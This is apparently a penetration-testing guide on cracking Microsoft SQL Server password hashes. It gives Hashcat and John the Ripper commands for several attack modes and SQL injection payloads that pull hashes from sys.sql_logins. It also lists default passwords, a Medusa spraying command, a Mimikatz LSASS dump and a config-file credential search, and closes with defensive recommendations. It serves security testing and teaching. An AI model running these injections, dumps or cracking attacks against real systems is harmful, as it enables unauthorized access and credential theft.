---
title: Password Cracking
description: Techniques for cracking Microsoft SQL Server password hashes
category: Authentication
order: 18
tags: ["password cracking", "hash", "authentication"]
lastUpdated: 2025-03-15
---

## Password Cracking

After extracting password hashes from Microsoft SQL Server, the next step in a penetration test is often to attempt cracking these hashes to recover plaintext passwords. This knowledge can be valuable for lateral movement, privilege escalation, or accessing other systems where credentials might be reused.

### SQL Server Hash Types

Before attempting to crack SQL Server password hashes, it's important to identify the hash type based on its format:

| SQL Server Version | Hash Format | Example |
|-------------------|-------------|---------|
| SQL Server 2000 | 0x0100[16-byte hash] | 0x0100B58E58130D2B6FF57F70737D3978 |
| SQL Server 2005+ | 0x0200[SHA-1 hash][salt] | 0x020058CD420B993C1C32561C772608D549FCEDFA66C8B733C3270DD8D3D32385D6580A6D367B |
| SQL Server 2012+ | 0x0200[SHA-512 hash][salt] | (longer hash with same prefix) |

### Cracking Tools

Several tools can be used to crack SQL Server password hashes:

| Tool | Description | Strengths |
|------|-------------|-----------|
| Hashcat | GPU-accelerated password cracker | Fast, supports many attack modes, highly customizable |
| John the Ripper | CPU-based password cracker | Well-established, user-friendly, supports many hash types |
| Metasploit | Framework with SQL Server modules | Integrated with pentesting workflow |
| SQLPing/SQLPAT | Specialized SQL Server tools | SQL Server-specific capabilities |
| Hydra/Medusa | Online password crackers | For direct SQL Server authentication attempts |

### Hashcat Commands for SQL Server Hashes

```bash
# SQL Server 2000 (hash mode 131)
hashcat -m 131 -a 0 mssql_hashes.txt wordlist.txt

# SQL Server 2005 (hash mode 132)
hashcat -m 132 -a 0 mssql_hashes.txt wordlist.txt

# SQL Server 2012+ (hash mode 1731)
hashcat -m 1731 -a 0 mssql_hashes.txt wordlist.txt
```

### John the Ripper Commands

```bash
# SQL Server 2000
john --format=mssql mssql_hashes.txt

# SQL Server 2005+
john --format=mssql05 mssql_hashes.txt

# SQL Server 2012+
john --format=mssql12 mssql_hashes.txt
```

### Attack Strategies

#### Dictionary Attack

Using a wordlist of common passwords:

```bash
hashcat -m 132 -a 0 mssql_hashes.txt rockyou.txt
```

#### Rule-based Attack

Applying transformations to dictionary words:

```bash
hashcat -m 132 -a 0 mssql_hashes.txt rockyou.txt -r rules/best64.rule
```

#### Brute Force Attack

Trying all possible combinations of characters:

```bash
# Brute force up to 8 characters
hashcat -m 132 -a 3 mssql_hashes.txt ?a?a?a?a?a?a?a?a
```

#### Mask Attack

Targeted brute force using patterns:

```bash
# Target 8-char passwords with specific pattern
hashcat -m 132 -a 3 mssql_hashes.txt ?u?l?l?l?l?l?d?d
```

#### Hybrid Attack

Combining dictionary words with patterns:

```bash
# Words from dictionary with up to 4 digits appended
hashcat -m 132 -a 6 mssql_hashes.txt rockyou.txt ?d?d?d?d
```

### Hash Extraction Techniques

Before cracking, you need to extract hashes. With SQL injection access:

```sql
-- Direct extraction as sysadmin
' UNION SELECT name, CAST(password_hash AS varchar(max)) FROM sys.sql_logins--

-- Retrieving SA password hash
' UNION SELECT name, CAST(password_hash AS varchar(max)) FROM sys.sql_logins WHERE name = 'sa'--
```

### Format Conversion for Cracking Tools

SQL Server hashes often need to be reformatted for cracking tools:

#### SQL Server 2000 Format

```
# Original format
0x0100B58E58130D2B6FF57F70737D3978

# Hashcat format (just remove 0x)
0100B58E58130D2B6FF57F70737D3978
```

#### SQL Server 2005+ Format

```
# Original format
0x020058CD420B993C1C32561C772608D549FCEDFA66C8B733C3270DD8D3D32385D6580A6D367B

# Hashcat format (remove 0x and separate hash and salt)
020058CD420B993C1C32561C772608D549FCEDFA:66C8B733C3270DD8D3D32385D6580A6D367B
```

### Common Default and Weak Passwords

Many SQL Server installations use default or weak passwords:

| Username | Common Passwords |
|----------|------------------|
| sa | (empty), sa, password, Password123, sqlserver, sql, p@ssw0rd, admin |
| admin | admin, password, Password123, Admin123 |
| sqladmin | sqladmin, password, Password123 |
| [company name] | [company name], [company name]123, Welcome123 |

### Password Policy Considerations

SQL Server's password policies affect cracking success:

1. When `CHECK_POLICY = ON`, passwords must meet Windows complexity requirements:
   - At least 8 characters
   - Mix of uppercase, lowercase, numbers, and symbols
   - Not include username

2. Without policy enforcement (`CHECK_POLICY = OFF`), simpler passwords might be used

3. SQL Server 2019+ may use additional security features making cracking more difficult

### Optimizing Cracking Performance

#### Hashcat Optimizations

```bash
# Use multiple GPUs
hashcat -m 132 -a 0 -d 1,2,3 mssql_hashes.txt wordlist.txt

# Optimize workload
hashcat -m 132 -a 0 -w 3 mssql_hashes.txt wordlist.txt

# Use custom character sets
hashcat -m 132 -a 3 mssql_hashes.txt -1 ?l?u?d ?1?1?1?1?1?1?1?1
```

#### John the Ripper Optimizations

```bash
# Use multiple cores
john --format=mssql05 --fork=4 mssql_hashes.txt

# Use session for resume capability
john --format=mssql05 --session=sqlserver mssql_hashes.txt
```

### Real-World Attack Workflow

1. **Extract hashes**:
   ```sql
   -- Extract all hashes to a file
   SELECT 'sa:0x' + CONVERT(varchar(max), password_hash, 2) FROM sys.sql_logins;
   ```

2. **Format hashes properly**:
   ```bash
   # Script to convert SQL Server 2005+ hashes to hashcat format
   cat sql_hashes.txt | sed 's/0x0200\([0-9A-F]*\)/0200\1/g' | sed 's/\(.\{40\}\)\(.*\)/\1:\2/g' > formatted_hashes.txt
   ```

3. **Run cracking tools**:
   ```bash
   hashcat -m 132 -a 0 formatted_hashes.txt rockyou.txt -r rules/best64.rule
   ```

4. **Check results**:
   ```bash
   hashcat -m 132 formatted_hashes.txt --show
   ```

### Special SQL Server Password Considerations

1. **Case Sensitivity**: SQL Server login passwords are case-sensitive by default

2. **Unicode Support**: SQL Server supports Unicode passwords, significantly increasing the password space

3. **Clear-Text Caching**: SQL Server may cache passwords in memory, creating additional attack vectors beyond hash cracking

4. **Salting**: SQL Server 2005+ uses salting, making rainbow table attacks ineffective

5. **Service Account Reuse**: Often, SQL Server service accounts have their passwords reused across multiple services

### Alternative Attack Vectors

When hash cracking is difficult, consider:

1. **Password Spraying**: Attempting common passwords against multiple accounts
   ```bash
   medusa -h target -u sa -P common_passwords.txt -M mssql
   ```

2. **Keylogging/Memory Dumping**: On compromised servers, extract credentials from memory
   ```bash
   # Using Mimikatz to extract from LSASS memory
   mimikatz "sekurlsa::logonpasswords" exit
   ```

3. **Credential Theft from Configuration Files**: Many applications store SQL Server credentials in config files
   ```bash
   # Example PowerShell search for connection strings
   Get-ChildItem -Path C:\ -Recurse -Include *.config -ErrorAction SilentlyContinue | Select-String -Pattern "connectionString" -SimpleMatch
   ```

### Security Recommendations

To protect against password cracking:

1. Use Windows Authentication instead of SQL Authentication when possible
2. Enforce strong password policies with `CHECK_POLICY = ON`
3. Use complex, unique passwords for SQL accounts
4. Implement Multi-Factor Authentication (MFA) for SQL Server access
5. Regularly rotate SQL Server service account passwords
6. Monitor for unauthorized access attempts with SQL Server Audit
7. Consider using Always Encrypted for sensitive data
